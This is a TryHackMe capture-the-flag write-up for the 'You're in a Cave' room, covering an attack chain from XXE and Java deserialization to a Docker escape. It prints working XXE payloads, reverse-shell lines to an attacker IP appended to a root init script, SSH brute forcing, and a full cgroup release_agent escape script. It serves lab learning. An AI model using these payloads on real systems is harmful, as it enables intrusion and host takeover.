# [TryHackMe — You're in a Cave](https://tryhackme.com/room/inacave)

## Overview

"You're in a Cave" is a hard-rated TryHackMe room with an RPG dungeon theme. The narrative follows a cave explorer encountering characters like a skeleton, an old man, and a door — each stage of the story corresponds to a real technical challenge. The room runs inside a Docker container, and the final objective is to escape that container and reach the host machine. There are two flags — one inside the container as root, and one on the host.
This was definitely the most challenging room so far. A week long grind requiring a lot of learning and evaluating in order to reach objectives!

**Attack chain:**
```
Recon → ffuf → Base64 encoded Java objects discovered
→ XXE injection via action.php → Read RPG.java source
→ Java deserialization RCE → Shell as cave
→ Regex wordlist generation → SSH brute force → Shell as door
→ GPG decryption → Environment variable abuse → Shell as skeleton
→ Symlink abuse → Modify root's init script → Root shell (container)
→ Docker detection → cgroup release_agent exploit → Root shell (host)
```

Connecting to port 3333 with netcat:

```bash
nc <TARGET_IP> 3333
```

Returned an RPG-style prompt:
```
You find yourself in a cave, what do you do?
```

Random input returned `Nothing happens` and disconnected.

Then ran ffuf to enumerate web directories:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt \
  -u http://<TARGET_IP>/FUZZ \
  -mc 200,301,302,403 -t 64
```

Found several endpoints:
```
/search, /attack, /lamp, /matches, /walk, /img, /r, /poem
```

Each endpoint returned a **Base64 encoded string**. Decoding revealed they were serialized Java objects:

```bash
base64 --decode lamp > lamp_decoded
strings lamp_decoded | awk 'length($0) > 10'
```

Two endpoints were particularly revealing:
- `/matches` → revealed the server's working directory: `/home/cave/src`
- `/lamp` → revealed a directory listing showing Java source and class files:
  - `RPG.java`, `Action.class`, `Serialize.class`, `commons-io-2.7.jar`

The decoded objects also showed **backtick command execution** inside the serialized data:

```
`ls;export INVENTORY=lamp:$INVENTORY`   ← lamp
`pwd`                                    ← matches
```

## 2. XXE Injection — Reading Server Files

The `/action.php` endpoint accepted POST requests. Changing the `Content-Type` header in Burp Suite from `application/x-www-form-urlencoded` to `application/xml` returned XML parsing errors — confirming the server was processing XML input.

Crafted an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<action>&xxe;</action>
```

![XXE payload returning /etc/passwd](/assets/images/writeups/cave/xxe-passwd.png)

  *External entity successfully resolved — /etc/passwd returned in response*

This confirmed external entities and DTD loading were both enabled. Reading `action.php` source via PHP wrapper (needed to avoid XML parser conflicts with PHP tags):

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/action.php">
```

Decoded the response:

```bash
echo "<base64response>" | base64 --decode
```

The source confirmed the vulnerability:

```php
libxml_disable_entity_loader(false);  // explicitly enables external entities
$dom->loadXML($data, LIBXML_NOENT | LIBXML_DTDLOAD);  // entities substituted
echo $xml;  // output reflected back
```

`LIBXML_NOENT` substitutes entities and `LIBXML_DTDLOAD` loads the DTD — both required for XXE to work. The developer had explicitly enabled both.

Most importantly, used XXE to retrieve the cave service source code:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/cave/src/RPG.java">
```

## 3. Java Deserialization RCE — Shell as cave

Analysing `RPG.java` revealed the full attack chain. The service on port 3333:

1. Takes user input
2. Appends it to `http://cave.thm/` to form a URL
3. Fetches that URL from the web server
4. Base64 decodes the response
5. Deserializes it into a Java `Action` object
6. Calls `action.action()` which executes the shell command stored in the object's `command` field

This meant by controlling what `action.php` returns — by making it serve a malicious serialized Java object — the command inside that object would execute on the server.

A modified version of the room's own serialization code was used to generate a Base64 encoded serialized `Action` object with a reverse shell in the command field.

**Critical issue:** Base64 special characters (`+`, `/`, `=`) were breaking the URL, and `scanner.nextLine()` only reads a single line — so the payload had to be **URL-encoded** before sending.

Started a listener:

```bash
nc -lvnp 9001
```

After URL-encoding and sending the payload, port 3333 fetched it from `action.php`, deserialized it, and executed the command:

```bash
cave@<TARGET>:~$
```

![Reverse shell as cave](/assets/images/writeups/cave/cave-shell.png)

  *Malicious serialized Java object executed — reverse shell received as cave*

## 4. cave → door (Regex Wordlist + SSH Brute Force)

Inside cave's home directory, `info.txt` described a wooden door without a keyhole, with a regex pattern carved on it representing the password:

```
^ed[h#f]{3}[123]{1,2}xf[!@#*]$
```

Breaking down the regex:

| Part | Meaning |
|---|---|
| `^ed` | Must start with `ed` |
| `[h#f]{3}` | Exactly 3 chars from h, #, or f |
| `[123]{1,2}` | One or two chars from 1, 2, or 3 |
| `xf` | Literal `xf` |
| `[!@#*]$` | Ends with one of !, @, #, * |

Wrote a Python script using `itertools.product` to generate every valid combination and saved them to a wordlist. Then used Hydra to brute force SSH:

```bash
hydra -l door -P wordlist.txt ssh://<TARGET_IP> -s 2222
```

![Hydra brute forcing door's SSH password](/assets/images/writeups/cave/hydra-door.png)

  *Hydra returns the correct password matching the regex pattern*

```bash
ssh door@<TARGET_IP> -p 2222
door@<TARGET>:~$
```

## 5. door → skeleton (GPG Decryption + Environment Variable Abuse)

In door's home directory found two files:
- `oldman.gpg` — a GPG encrypted message
- `adventurer.priv` — a GPG private key

Imported the private key and decrypted the message:

```bash
gpg --import adventurer.priv
gpg --decrypt oldman.gpg
```

The decrypted message revealed a Zelda-themed hint:
```
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
```

The directory also contained a compiled binary called `skeleton`. Running it returned:

```
Inventory is empty, you cannot defeat the skeleton
```

Running `strings` on the binary revealed it was checking an environment variable called `INVENTORY`. Exported the weapon name and ran the binary:

```bash
export INVENTORY=bone-breaking-war-hammer
./skeleton
```

The binary executed successfully and output the password for the `skeleton` user.

```bash
ssh skeleton@<TARGET_IP> -p 2222
skeleton@<TARGET>:~$
```

## 6. skeleton → root (Symlink Abuse + Init Script Modification)

Enumeration as skeleton revealed two key findings:

```bash
sudo -l
# (root) NOPASSWD: /bin/kill

find / -writable -type d 2>/dev/null
# /opt/link/
```

`/opt/link/` was world-writable and contained a symlink called `startcon` pointing to `/root/start.sh`.

Reading `start.sh` revealed it was **PID 1** — the container's init script — running sequentially:
1. Starting SSH
2. Starting Apache
3. Running the Java service as cave via `su`
4. Dropping into `/bin/bash`

The script was permanently stuck at the `su - cave` line waiting for the Java process.

Because `startcon` is a symlink to the real `/root/start.sh`, appending to `startcon` appends to the actual file:

```bash
echo '/bin/bash -i >& /dev/tcp/<KALI_IP>/9001 0>&1' >> /opt/link/startcon
```

Started a listener:

```bash
nc -lvnp 9001
```

Then killed the root bash process (the final `/bin/bash` in `start.sh` already running as PID 114) using the sudo permission:

```bash
sudo /bin/kill -9 114
```

This caused `start.sh` to rerun that final section, hit the appended reverse shell line, and connect back — giving a root shell inside the container.

```bash
root@<TARGET>:~#
```

![Root shell inside container](/assets/images/writeups/cave/container-root.png)

  *Killing the bash PID triggered start.sh to rerun — hitting our appended reverse shell*

## 7. Detecting the Docker Container

Three indicators confirmed the environment was a Docker container:

```bash
ls /.dockerenv          # exists at filesystem root

cat /proc/1/cgroup      # every entry contains /docker/<container_id>

ps aux                  # unusually few processes, PID 1 is a bash script
                        # not systemd or init
```

## 8. Docker Container Escape (cgroup release_agent)

The room indicated a flag existed on the **host machine**. Used the cgroup `release_agent` exploit — abusing the Linux kernel's cgroup notification mechanism.

The steps:

```bash
# Mount a cgroup filesystem inside the container
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Find container's path on the host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create the payload script on the host filesystem
echo "#!/bin/bash" > $host_path/exploit.sh
echo "bash -i >& /dev/tcp/<KALI_IP>/9002 0>&1" >> $host_path/exploit.sh
chmod +x $host_path/exploit.sh

# Set release_agent to our script
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent

# Trigger it
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Because the `release_agent` fires as **root on the host kernel** — not inside the container — the reverse shell connected back from the actual host machine.

```bash
# Attacker terminal
nc -lvnp 9002

root@host:~# cat /root/info.txt
THM{digging_down_then_digging_up}
```

![Host root shell via cgroup escape](/assets/images/writeups/cave/host-root.png)

  *release_agent fires on the host kernel — shell received as host root*

## Key Takeaways

| Technique | Lesson |
|---|---|
| Base64 encoded Java objects | Decode and run `strings` on unknown binary data to reveal structure |
| XXE injection | `LIBXML_NOENT` + `LIBXML_DTDLOAD` + external entities = XXE. Always check Content-Type |
| PHP wrapper for XXE | `php://filter/convert.base64-encode/resource=` bypasses XML conflicts with PHP files |
| Java deserialization RCE | If a service deserializes user-controlled data, you control what executes |
| URL encoding Base64 | Base64 special characters break URLs — always URL-encode before sending |
| Regex password generation | A regex pattern defines every valid password — `itertools.product` generates them all |
| GPG decryption | Private key + encrypted file = decrypted secret. Always check for `.gpg` and `.priv` files |
| Environment variable abuse | Binaries that check `$ENV_VAR` can be manipulated by exporting the expected value |
| Symlink abuse | Writing to a symlink writes to its target — world-writable directories containing symlinks to privileged files are dangerous |
| Docker detection | `/.dockerenv`, `/proc/1/cgroup`, and unusual PID 1 all indicate a container |
| cgroup release_agent escape | The release_agent fires on the host kernel — container boundaries don't apply |
